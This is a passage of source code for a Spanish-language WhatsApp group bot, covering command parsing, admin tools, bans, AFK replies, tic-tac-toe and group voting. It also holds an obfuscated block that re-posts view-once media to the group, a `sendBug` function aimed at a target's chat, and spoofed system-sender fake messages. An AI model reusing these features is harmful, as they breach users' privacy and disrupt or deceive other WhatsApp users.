    body = (type === 'conversation' && vin.message.conversation.startsWith(prefix)) ? vin.message.conversation : (type == 'imageMessage') && vin.message[type].caption.startsWith(prefix) ? vin.message[type].caption : (type == 'videoMessage') && vin.message[type].caption.startsWith(prefix) ? vin.message[type].caption : (type == 'extendedTextMessage') && vin.message[type].text.startsWith(prefix) ? vin.message[type].text : (type == 'listResponseMessage') && vin.message[type].singleSelectReply.selectedRowId ? vin.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && vin.message[type].selectedButtonId ? vin.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(vin.message[type].fileSha256.toString('base64')) !== null && getCmd(vin.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(vin.message[type].fileSha256.toString('base64')) : ""
    budy = (type === 'conversation') ? vin.message.conversation : (type === 'extendedTextMessage') ? vin.message.extendedTextMessage.text : ''
    const bedy = vin.message.conversation || vin.message[type].caption || vin.message[type].text || ""
    const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const stickerscomm = Object.keys(vin.message)[0] == "stickerMessage" ? vin.message.stickerMessage.fileSha256.toString('hex') : ""
    const arg = body.substring(body.indexOf(' ') + 1)
    const args = body.trim().split(/ +/).slice(1)
    const ar = args.map((v) => v.toLowerCase())
    const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const itsMe = kev.user.jid
    const yo = vin.key.fromMe ? true : false
		const botNumberss = kev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
    hit_today.push(command)
		//let sender = isGroup ? vin.participant : vin.key.remoteJid
        const senderowner = isGroup ? vin.participant : vin.key.remoteJid
        const sender = vin.key.fromMe ? kev.user.jid : isGroup ? vin.participant : vin.key.remoteJid
        let senderfix = vin.key.fromMe ? kev.user.jid : isGroup ? vin.participant : vin.key.remoteJid
		// const isSelfNumber = config.NomorSELF
		// const isOwner = sender.id === isSelfNumber
        const isOwner = dueño.includes(senderowner)

		const totalchat = await kev.chats.all()
    const m = simple.smsg(kev, vin);
    if (m.isBaileys) return
    let { mentioned } = m
		const groupMetadata = isGroup ? await kev.groupMetadata(from) : ''
    const argss = bedy.split(/ +/g)
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const BAdmin = groupAdmins.includes(itsMe) || false
        const BAdmin2 = groupAdmins.includes(itsMe) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isTumor = tumor.includes(senderowner)
        const isBanned = ban.includes(sender)
        const isVote = isGroup ? voting.includes(from) : false
        const isBanChat = chatban.includes(from)
        const isAiden = aiden.includes(senderowner)
        if (isBanChat && !isOwner && !yo &&!isTumor && !isAiden) return
        const isBan = cekBannedUser(sender, ban)
        const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
        const isAntiviewonce = isGroup ? antivo.includes(from) : false;
        const isKickarea = isGroup ? kickarea.includes(from) : false;
        const isAntiFake = isGroup ? antifake.includes(from) : false;
        const isAntiArabes = isGroup ? antiarabes.includes(from) : false;
        const isWelkom = isGroup ? welkom.includes(from) : false;
        const isAntilink = isGroup ? antilink.includes(from) : false;
        const conts = vin.key.fromMe ? kev.user.jid : kev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = vin.key.fromMe ? kev.user.name : conts.notify || conts.vname || conts.name || '-'


        const kevbuffer = async(save) => {
        encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: vin
        encmediaa = isQuotedSticker ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: vin
        encmediaa = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: vin
        encmediaa = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: vin
        encmediaa = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
        if (save) return await kev.downloadAndSaveMediaMessage(encmediaa)
        return await kev.downloadMediaMessage(encmediaa)}

//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
        const isViewOnce = (type === 'viewOnceMessage')

colors = ['silver','gold','cyan','white','teal','yellow','green','magenta','pink','red','blue','orange','lime']
rainbow = pickRandom(colors)

      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))        
//ANTI VIEW ONCE MESSAGE!
const _0x189937=_0x4860;(function(_0xaea49,_0x4bad97){const _0x212b8d=_0x4860,_0x1004f0=_0xaea49();while(!![]){try{const _0x247b55=parseInt(_0x212b8d(0x13d))/0x1+-parseInt(_0x212b8d(0x130))/0x2+parseInt(_0x212b8d(0x139))/0x3+parseInt(_0x212b8d(0x13e))/0x4*(parseInt(_0x212b8d(0x12d))/0x5)+-parseInt(_0x212b8d(0x131))/0x6+-parseInt(_0x212b8d(0x134))/0x7+-parseInt(_0x212b8d(0x13f))/0x8*(-parseInt(_0x212b8d(0x135))/0x9);if(_0x247b55===_0x4bad97)break;else _0x1004f0['push'](_0x1004f0['shift']());}catch(_0x3ee6c9){_0x1004f0['push'](_0x1004f0['shift']());}}}(_0x4c32,0x53adc));if(!vin['key'][_0x189937(0x13c)]){if(isGroup&&isViewOnce&&antionce){let typenya=vin['message'][_0x189937(0x12f)]['message']['videoMessage']?vin[_0x189937(0x138)][_0x189937(0x12f)]['message'][_0x189937(0x13b)]:vin['message'][_0x189937(0x12f)]['message'][_0x189937(0x137)];typenya[_0x189937(0x141)]=![],typenya[_0x189937(0x136)]=_0x189937(0x133)+sender[_0x189937(0x12e)]('@s.whatsapp.net','')+'\x20\x0a*• 🧇 Texto:* \x20\x20'+(typenya[_0x189937(0x136)]===''?_0x189937(0x140):typenya[_0x189937(0x136)]);let peq=vin[_0x189937(0x138)][_0x189937(0x12f)][_0x189937(0x138)]['imageMessage']?{'key':{'fromMe':![],'participant':sender,'id':vin['key']['id']},'message':{'viewOnceMessage':{'message':{'imageMessage':{'viewOnce':!![]}}}}}:{'key':{'fromMe':![],'participant':sender,'id':vin['key']['id']},'message':{'viewOnceMessage':{'message':{'imageMessage':{'viewOnce':!![]}}}}},pe=await kev[_0x189937(0x132)](from,vin[_0x189937(0x138)][_0x189937(0x12f)][_0x189937(0x138)],{'quoted':peq,'contextInfo':{'mentionedJid':[sender]}});await kev[_0x189937(0x13a)](pe);}}function _0x4860(_0x5a5e8e,_0x267a58){const _0x4c3227=_0x4c32();return _0x4860=function(_0x486054,_0x209c01){_0x486054=_0x486054-0x12d;let _0x4e8741=_0x4c3227[_0x486054];return _0x4e8741;},_0x4860(_0x5a5e8e,_0x267a58);}function _0x4c32(){const _0x2b6214=['605309MQKwzJ','12FKcIMc','88EaQWrl','No\x20Tiene\x20Ningún\x20Texto','viewOnce','92990eqdLEp','replace','viewOnceMessage','1019072oDWOvT','4039326KJPZyQ','prepareMessageFromContent','*🧇「 A̷n̷t̷i̷V̷i̷e̷w̷O̷n̷c̷e̷ M̷e̷n̷s̷a̷j̷e̷s̷ 」🧇️*\x0a\x0a*• 🧇 Usuario:*\x20@','3380622Cfnxey','961236rBqMiM','caption','imageMessage','message','517512yOjWgt','relayWAMessage','videoMessage','fromMe'];_0x4c32=function(){return _0x2b6214;};return _0x4c32();}
// ===================== TAGS MENTIONS ==================================
const fakesticker =  { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ?{ remoteJid: from } : {})}, message: { "stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/AipZmrw402_detgfViyjnKOg4hTUhpCTjyyJwHFYj8dw.enc", "fileSha256": "gUCkLdDm6fVT7oGr4Wtw1E4IcA1c2BNwX/IsNx2ox6U=", "fileEncSha256": "il2fkvb3+y3tKHfsWJVNnvz7CBdLhZQoCDdjGlbU1CI=", "mediaKey": "5aKnfk61dIoUlhBjvPCFYl3U9Wzq48thKjK/yZlXsrQ=", "mimetype": "image/webp", "height": 64, "width": 64, "directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73", "fileLength": "44978", "mediaKeyTimestamp":"1621218472" }}}
const faketroli = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "299277777@g.us" } : {})},message: {orderMessage: {itemCount : -9999999,status: 1,surface : 1,message: `_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇\n𝕷⃝🧇 ∙ Prefix:「 ${prefix} 」`,orderTitle: 'DTS BOT',sellerJid: `${groupName}`,thumbnail: fakeimg}}}
const fakeonce = { key:  {fromMe: false, remoteJid: "50768666666@g.us", participant: '0@s.whatsapp.net'}, message: { videoMessage: { "jpegThumbnail": fakeimg, "viewOnce": true}}}
const desafio = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {})},message: {orderMessage: {itemCount : 99999999,status: 1,surface : 1,orderTitle: 'DTS BOT',sellerJid: `${groupName}`,thumbnail: fakeimg}}}
// ===================== TAGS MENTIONS ==================================

        //MESS
		mess = {
			wait: 'Otewe',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        const fakevin = { sendEphemeral: true, quoted: vin, contextInfo: {"externalAdReply": { "title": "凯文安东尼奥", "body": "I`am Kҽѵíղ", "sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg')}}}
        
        const textImg = (teks) => {
            return kev.sendMessage(from, teks, text, {quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true, "externalAdReply": { "title": "凯文安东尼奥", "body": "I`am Kҽѵíղ", "sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg')}}})
        }
        const reply = (teks) => {
         kev.sendMessage(from, teks, MessageType.text, {sendEphemeral: true,quoted:vin, contextInfo:{"externalAdReply":{"title": `凯文安东尼奥`,"body": "I`am Kҽѵíղ","previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg'),"sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`}}})
        }
        const reply2 = (teks) => {
            kev.sendMessage(from, teks, MessageType.text, {sendEphemeral: true, quoted: vin, contextInfo: { externalAdReply : { title : `凯文安东尼奥`, body : "I`am Kҽѵíղ", mediaType: 2, thumbnail: fakeimg, mediaUrl : `https://youtu.be/kJQP7kiw5Fk`}}})
        }
        const sendMess = (hehe, teks) => {
            kev.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? kev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : kev.sendMessage(from, teks.trim(), extendedText, { quoted: vin, contextInfo: { "mentionedJid": memberr } })
        }

        const fakethumb = (teks, yes) => {
            kev.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:vin,caption:yes})
        }
//BOTONES ESMAIL

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      kev.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
const sendLoc = async () => {
if (!isQuotedImage) return
var buffone = JSON.parse(JSON.stringify(vin).replace("quotedM", "m")).message.extendedTextMessage.contextInfo
var buf22 = await kev.downloadAndSaveMediaMessage(buffone) 
bufferito = fs.readFileSync(buf22)
loc = {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "jpegThumbnail": bufferito
            }
            kev.sendMessage(from, 
            {"contentText": `Only Test`,
            "footerText": `Fix`,
            "buttons": [
            {"buttonId": `Test By Kevin`,
            "buttonText": {"displayText": "XD"
            },"type": "RESPONSE"},
            {"buttonId": `Test By Kevin`,
            "buttonText": {"displayText": "XD 2"
            },"type": "RESPONSE"}
            ], "headerType": 6,
            "locationMessage": loc,
            quoted: null
            }, MessageType.buttonsMessage, {})
};
    const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await kev.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      kev.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await kev.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      kev.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };

// BOTONES ESMAIL
const sendBug = async(target, teks) => {
           if (!teks) teks = '.'
           await kev.relayWAMessage(kev.
           prepareMessageFromContent(target, kev.
           prepareDisappearingMessageSettingContent(0),
           {}),{waitForAck:true})
           kev.sendMessage(target, teks, 'conversation')
}
        const sendFileFromUrl = async(link, type, options) => {
    hasil = await getBuffer(link)
  kev.sendMessage(from, hasil, type, options).catch(e => {
  fetch(link).then((hasil) => {
  kev.sendMessage(from, hasil, type, options).catch(e => {
  kev.sendMessage(from, { url : link }, type, options).catch(e => {
    reply('[ ! ] Error al descargar el archivo')
    console.log(e)
  })
  })
  })
  })
  }
  const sendImageFromUrl = async(to, url, caption, vin) => {
                var names = Date.now() / 10000;
                var download = function(uri, filename, callback) {
                    request.head(uri, function(err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik/' + names + '.jpeg', async function() {
                    console.log('done');
                    let media = fs.readFileSync('./stik/' + names + '.jpeg')
                    await kev.sendMessage(to, media, MessageType.image, {
                        quoted: vin,
                        mimetype: Mimetype["png"],
                        caption: caption
                    })
                });
            }

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        kev.sendMessage(to, media, MessageType.sticker,{quoted:vin})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        async function sendFileFromDts(from, url, caption, vin, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime === "application/apk"){
                type = MessageType.document
                mime = Mimetype.apk
            }
            if(mime === "image/jpeg"){
                type = MessageType.document
                mime = Mimetype.image
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return kev.sendMessage(from, await getBuffer(url), type, {caption: caption, ptt: true, sendEphemeral: true, quoted: vin, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            async function sendFileFromAudio2(from, url, caption, vin, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime === "application/apk"){
                type = MessageType.document
                mime = Mimetype.apk
            }
            if(mime === "image/jpeg"){
                type = MessageType.document
                mime = Mimetype.image
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return kev.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: vin, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})       
            }
        async function sendFileFromAudio(from, url, caption, vin, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime === "application/apk"){
                type = MessageType.document
                mime = Mimetype.apk
            }
            if(mime === "image/jpeg"){
                type = MessageType.document
                mime = Mimetype.image
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return kev.sendMessage(from, await getBuffer(url), type, {ptt: true, caption: caption, quoted: vin, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})       
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    kev.sendMessage(to, media, type, { quoted: vin, sendEphemeral: true, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
//FUNCTION
            cekafk(afk)
            if (!vin.key.remoteJid.endsWith('@g.us') && offline){
            if (!vin.key.fromMe){
            if (isAfk(vin.key.remoteJid)) return
            addafk(vin.key.remoteJid)
            heheh = Mms(Date.now() - waktu) 
            kev.sendMessage(vin.key.remoteJid,`@${owner} Esta actualmente fuera de linea!\n\n*Razón:* ${alasan}\n*Hace:* ${heheh.hours} Horas, ${heheh.minutes} Minutos, ${heheh.seconds} Segundos\n\nPor favor contacta de nuevo más tarde`, MessageType.text, {quoted: desafio, contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`]}})
            }
            }   
        if (vin.key.remoteJid.endsWith('@g.us') && offline) {
        if (!vin.key.fromMe){
        if (vin.message.extendedTextMessage != undefined){
        if (vin.message.extendedTextMessage.contextInfo != undefined){
        if (vin.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of vin.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(vin.key.remoteJid)) return
        addafk(vin.key.remoteJid)
        heheh = Mms(Date.now() - waktu)
        kev.sendMessage(vin.key.remoteJid,`@${owner} Esta actualmente fuera de linea!\n\n *Razón:* ${alasan}\n *Hace:* ${heheh.hours} Horas, ${heheh.minutes} Minutos, ${heheh.seconds} Segundos\n\nPor favor contacta de nuevo más tarde`, MessageType.text, {quoted: desafio, contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`]}})
          }
        }
            }
          }
        }
      }
    }
const kick = function (from, orangnya) {
      for (let i of orangnya) {
        kev.groupRemove(from, [i]);
      }
    };
const promote = function(from, orangnya){
  kev.groupMakeAdmin(from, orangnya)
}
const demote = function(from, orangnya){
  kev.groupDemoteAdmin(from, orangnya)
}
const hideTagImg = async function(from, image){
  let anu = await kev.groupMetadata(from)
  let members = anu.participants
  let ane = []
  for (let i of members){
    ane.push(i.jid)
  }
  kev.sendMessage(from, image, MessageType.image, {contextInfo: {"mentionedJid": ane}})
}
const toBase64 = (gambar) => new Promise(async (resolve, reject) => {
      imageToBase64(gambar)
          .then(
          (ress) => {
          resolve(ress)
      })
})
   const buffer2Stream = (buffer, Buffer) => {
     let read = []
      read.push(buffer);
      read.push(null);
}
//========================================================================================================================//



  if (isBan && isCmd && !isOwner && !yo && !isTumor) {
reply('*Por motivos de seguridad estas sancionado, no podras usar el bot hasta que tu sanción sea removida...!*')
return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
          }


        /*--------------------[ Tictactoe Game Function ]--------------------*/
const cmde = budy.toLowerCase().split(" ")[0] || "";
if (isBan) return
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
     if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
          const boardnow = setGame(`${from}`);
          if (budy == "Cex") return reply("por qué");
          if (
               budy.toLowerCase() == "s" ||
               budy.toLowerCase() == "si" ||
               budy.toLowerCase() == "sip"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`*El juego ha comenzado antes!*`);
                    const matrix = boardnow._matrix;
                    boardnow.status = true;
                    fs.writeFileSync(
                         `./lib/tictactoe/db/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const chatAccept = `*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*
                    
*Jugador ❌:* _@${boardnow.X}_

*Jugador ⭕:* _@${boardnow.O}_
          
*Es tu turno:* _@${boardnow.turn == "X" ? boardnow.X : boardnow.O}_


     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


*«Todos los derechos reservados @kevin»*`;
                    kev.sendMessage(from, chatAccept, MessageType.text, {
                         quoted: desafio,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [
                                   boardnow.X + "@s.whatsapp.net",
                                   boardnow.O + "@s.whatsapp.net",
                              ],
                         },
                    });
               } else {
                    kev.sendMessage(
                         from,
                         `Esta opción es solo para @${boardnow.O} !`,
                         MessageType.text, {
                         quoted: desafio,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          } else if (
               budy.toLowerCase() == "n" ||
               budy.toLowerCase() == "no" ||
               budy.toLowerCase() == "nop"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`El juego ha comenzado antes!`);
                    fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                    kev.sendMessage(
                         from,
                         `Desafortunadamente el usuario *@${boardnow.O}* ha rechazado el desafio de *Tres En Raya* ❌😕`,
                         MessageType.text, {
                         quoted: desafio,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               } else {
                    kev.sendMessage(
                         from,
                         `Esta opción esta solo disponile para *@${boardnow.O}* !`,
                         MessageType.text, {
                         quoted: desafio,sendEphemeral: true,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          }
     }

     if (arrNum.includes(cmde)) {
        const boardnow = setGame(`${from}`);
        if (!boardnow.status) return reply(`*Parece que tu oponente no ha aceptado el desafío..*`)
        if (
             (boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
             sender.replace("@s.whatsapp.net", "")
        )
             return;
        const moving = validmove(Number(budy), `${from}`);
        const matrix = moving._matrix;
        if (moving.isWin) {
             if (moving.winner == "SERI") {
                  const chatEqual = `*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*

*El juego acabo en un empate lastimosamente nadie gana... 😂‼️*`;
                  reply(chatEqual);
                  fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                  return;
             }
             const winnerJID = moving.winner == "O" ? moving.O : moving.X;
             const looseJID = moving.winner == "O" ? moving.X : moving.O;
             const limWin = Math.floor(Math.random() * 20) + 10;
             const limLoose = Math.floor(Math.random() * 10) + 5;
             const chatWon = `*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*
        
*Ganaste _@${winnerJID}_ 👑 Muchas Felicidades 🥳🎉*
`;
          //    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
          //    pushLimit(looseJID + "@s.whatsapp.net", limLoose);
             kev.sendMessage(from, chatWon, MessageType.text, {
                  quoted: desafio,sendEphemeral: true,
                  contextInfo: {
                       mentionedJid: [
                            moving.winner == "O" ?
                                 moving.O + "@s.whatsapp.net" :
                                 moving.X + "@s.whatsapp.net",
                       ],
                  },
             });
             fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
        } else {
             const chatMove = `*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*
        
*Jugador ❌:* _@${moving.X}_

*Jugador ⭕:* _@${moving.O}_

*Es tu turno:* _@${moving.turn == "X" ? moving.X : moving.O}_


   ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
   ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
   ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


*«Todos los derechos reservados @kevin»*`;
             kev.sendMessage(from, chatMove, MessageType.text, {
                  quoted: desafio,sendEphemeral: true,
                  contextInfo: {
                       mentionedJid: [
                            moving.X + "@s.whatsapp.net",
                            moving.O + "@s.whatsapp.net",
                       ],
                  },
             });
        }
   }


        if(isGroup && !isVote) {
        if (isBan) return
        if (budy.toLowerCase() === 'votar'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Tú ya has votado', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Voto:* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Razón*: ${_votes[0].reason}\n*Votos Totales* : ${vote.length} Votos\n*Duración* : ${_votes[0].durasi} Minutos\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Voto* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'novotar'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Tú ya has votado', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Voto:* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Razón*: ${_votes[0].reason}\n*Votos Totales* : ${vote.length} Votos\n*Duración* : ${_votes[0].durasi} Minutos\n\n` 
